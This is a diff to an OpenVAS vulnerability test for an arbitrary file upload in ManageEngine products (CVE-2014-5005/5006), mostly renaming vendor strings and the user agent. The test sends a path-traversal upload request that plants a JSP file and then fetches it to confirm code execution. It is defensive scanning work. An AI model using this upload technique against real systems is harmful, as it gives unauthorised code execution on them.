@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_manageengine_desktopcentral_69494.nasl 11108 2018-08-24 14:27:07Z mmartin $
+# $Id: gb_manageengine_desktopcentral_69494.nasl 11222 2018-09-04 12:41:44Z cfischer $
 #
 # Multiple ManageEngine Products Arbitrary File Upload Vulnerability
 #
@@ -34,9 +34,9 @@ if(description)
   script_cve_id("CVE-2014-5005", "CVE-2014-5006");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_version("$Revision: 11108 $");
+  script_version("$Revision: 11222 $");
   script_name("Multiple ManageEngine Products  Arbitrary File Upload Vulnerability");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-24 16:27:07 +0200 (Fri, 24 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-04 14:41:44 +0200 (Tue, 04 Sep 2018) $");
   script_tag(name:"creation_date", value:"2014-09-09 13:20:38 +0200 (Tue, 09 Sep 2014)");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
@@ -48,7 +48,7 @@ if(description)
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/69494");
 
   script_tag(name:"impact", value:"An attacker may leverage this issue to upload arbitrary files to the
-  affected computer; this can result in arbitrary code execution within the context of the vulnerable application.");
+  affected computer. This can result in arbitrary code execution within the context of the vulnerable application.");
   script_tag(name:"vuldetect", value:"Check if it is possible to upload a file.");
   script_tag(name:"solution", value:"Ask the vendor for an update");
   script_tag(name:"solution_type", value:"VendorFix");
@@ -65,24 +65,26 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
+include("misc_func.inc");
 
 if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
 if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
-
 if( dir == "/" ) dir = "";
 
-ex = '<%= new String("OpenVAS RCE Test") %>';
+vt_string_lo = get_vt_string( lowercase:TRUE );
+vt_string = get_vt_string();
+pat = vt_string + " RCE Test";
+ex = '<%= new String("' + pat + '") %>';
 len = strlen( ex );
-
-host = http_host_name( port:port );
-
-file = 'openvas_' + rand() + '.jsp';
-
+file = vt_string_lo + '_' + rand() + '.jsp';
 url = dir + '/statusUpdate?actionToCall=LFU&customerId=1337&fileName=../../../../../../' + file + '&configDataID=1';
+
+useragent = get_http_user_agent();
+host = http_host_name( port:port );
 
 req = 'POST ' + url + ' HTTP/1.1\r\n' +
       'Host: ' + host + '\r\n' +
-      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
+      'User-Agent: ' + useragent + '\r\n' +
       'Content-Length: ' + len + '\r\n' +
       'Accept: */*\r\n' +
       'Content-Type: multipart/form-data;\r\n' +
@@ -94,7 +96,7 @@ url = dir + "/" + file;
 req = http_get( item:url, port:port );
 buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
 
-if( "OpenVAS RCE Test" >< buf ) {
+if( pat >< buf ) {
   report  = 'It was possible to upload the file "' + dir + '/' + file + '". Please delete this file.';
   report += '\n' + report_vuln_url( url:url, port:port );
   security_message( port:port, data:report );
